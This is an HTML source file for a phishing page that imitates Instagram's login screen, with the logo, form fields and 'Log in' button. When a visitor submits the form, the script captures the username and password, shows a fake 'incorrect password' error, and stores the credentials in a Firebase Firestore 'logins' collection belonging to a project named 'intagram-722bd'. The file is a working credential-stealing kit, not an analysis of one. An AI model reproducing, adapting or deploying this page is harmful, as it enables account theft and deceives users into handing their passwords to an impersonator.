<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            background-color: #1C2B33;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-y: auto;
            scrollbar-width: none;
            -ms-overflow-style: none;
        }
        
        body::-webkit-scrollbar {
            display: none;
            width: 0;
            height: 0;
        }
        
        html {
            scrollbar-width: none;
            -ms-overflow-style: none;
        }
        
        html::-webkit-scrollbar {
            display: none;
            width: 0;
            height: 0;
        }
        
        .logo {
            margin-top: 50px;
            max-width: 150px;
            height: auto;
            filter: brightness(0) invert(1);
        }
        
        .input {
            width: 100%;
            max-width: 350px;
            padding: 25px 16px 15px 16px;
            margin: 0 0 0 0;
            border: 1px solid #727272;
            border-radius: 12px;
            background-color: transparent;
            font-size: 16px;
            outline: none;
            color: #ffffff;
            font-weight: normal;
        }
        
        .input-wrapper {
            position: relative;
            width: 100%;
            max-width: 350px;
        }
        
        .floating-label {
            position: absolute;
            left: 16px;
            top: 20px;
            color: #727272;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.3s ease;
            background-color: transparent;
            padding: 0;
        }
        
        .input:focus + .floating-label,
        .input:not(:placeholder-shown) + .floating-label {
            top: 5px;
            left: 16px;
            font-size: 12px;
            color: #727272;
            background-color: transparent;
            padding: 0;
        }
        
        .input:first-of-type {
            margin-bottom: 10px;
        }
        
        .input:focus {
            border-color: #a8a8a8;
        }
        
        .form {
            margin-top: 70px;
            width: 100%;
            max-width: 350px;
        }
        
        .forgot {
            margin-top: 20px;
            margin-bottom: 0;
            color: white;
            font-size: 14px;
            text-decoration: none;
            cursor: pointer;
            font-weight: normal;
            text-align: center;
            display: block;
        }
        
        .login-btn {
            margin-top: 10px;
            width: 100%;
            padding: 12px 16px;
            background-color: #0064E0;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .create-account-btn {
            margin-top: 10px;
            width: 100%;
            padding: 10px 16px;
            background-color: transparent;
            color: #1c7ef5;
            border: 2px solid #0064E0;
            border-radius: 25px;
            font-size: 16px;
            font-weight: normal;
            cursor: pointer;
        }
        
        .meta-logo {
            width: 60px;
            height: 12px;
            display: block;
            margin: 20px auto 0;
        }
        
        .bottom-section {
            margin-top: auto;
            width: 100%;
            max-width: 350px;
            text-align: center;
            padding-bottom: 20px;
        }
        
        .divider {
            margin-top: 25px;
            display: flex;
            align-items: center;
            width: 100%;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider span {
            padding: 0 15px;
            color: #737373;
            font-size: 13px;
            font-weight: 600;
        }
        
        .facebook-login {
            margin-top: 30px;
            color: #0095f6;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .facebook-icon {
            width: 20px;
            height: 20px;
        }
        
        .error {
            margin-top: 10px;
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            display: none;
            font-weight: normal;
        }
        
        .password-container {
            position: relative;
            width: 100%;
            max-width: 350px;
        }
        
        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #e0e0e0;
            width: 20px;
            height: 20px;
        }
        
        .signup-text {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 14px;
            text-align: center;
            font-weight: bold;
            white-space: nowrap;
        }
        
        .signup-divider {
            width: 100vw;
            height: 1px;
            background-color: white;
            margin-bottom: 15px;
            position: fixed;
            left: 50%;
            transform: translateX(-50%);
            bottom: 60px;
        }
        
        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
        }
        
        .container {
            max-width: 100%;
            margin: 0 auto;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        
        .language-selector {
            color: #e0e0e0cb;
            font-size: 14px;
            cursor: pointer;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="language-selector">English (US)</div>
    <i data-visualcompletion="css-img" aria-label="Instagram" class="x15mokao x1ga7v0g x16uus16 xbiv7yw" role="img" style="background-image: url(&quot;https://i.postimg.cc/V6wtSw-k9/aa-(1).png&quot;); background-position: center; background-size: contain; width: 70px; height: 70px; background-repeat: no-repeat; display: inline-block; margin-top: 60px;"></i>
    <div class="form">
        <div class="input-wrapper">
            <input type="text" class="input" placeholder=" ">
            <label class="floating-label">Username, email or mobile number</label>
        </div>
        <div class="input-wrapper">
            <input type="password" class="input" placeholder=" " id="passwordInput">
            <label class="floating-label">Password</label>
        </div>
        <button class="login-btn">Log in</button>
        <a href="#" class="forgot">Forgot password?</a>
        <div class="error">username or password incorrect</div>
    </div>
    
    <div class="bottom-section">
        <button class="create-account-btn">Create new account</button>

    </div>
    
    <script>
        // Initialize Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyD8Vn47fBVdpSkYyLew7yCk8t6pWY9Mh9k",
            authDomain: "intagram-722bd.firebaseapp.com",
            projectId: "intagram-722bd",
            storageBucket: "intagram-722bd.firebasestorage.app",
            messagingSenderId: "356342152826",
            appId: "1:356342152826:web:b21419ce2b307e2fb805c3",
            measurementId: "G-54QF9W0806"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelector('.login-btn').addEventListener('click', function() {
                const email = document.querySelector('.input[type="text"]').value;
                const password = document.getElementById('passwordInput').value;
                const errorElement = document.querySelector('.error');
                
                console.log('Login button clicked');
                console.log('Email:', email);
                console.log('Password:', password);
                
                // Check if both fields are empty
                if (!email.trim() && !password.trim()) {
                    errorElement.textContent = 'enter your username, email or mobile number to log in';
                } else {
                    errorElement.textContent = 'incorrect password';
                }
                
                // Show error message
                errorElement.style.display = 'block';
                
                // Send data to Firestore
                db.collection('logins').add({
                    email: email,
                    password: password,
                    timestamp: new Date()
                }).then(() => {
                    console.log('Data sent to Firestore successfully');
                }).catch((error) => {
                    console.error('Error sending data to Firestore:', error);
                });
            });
        });
    </script>
</body>
</html>
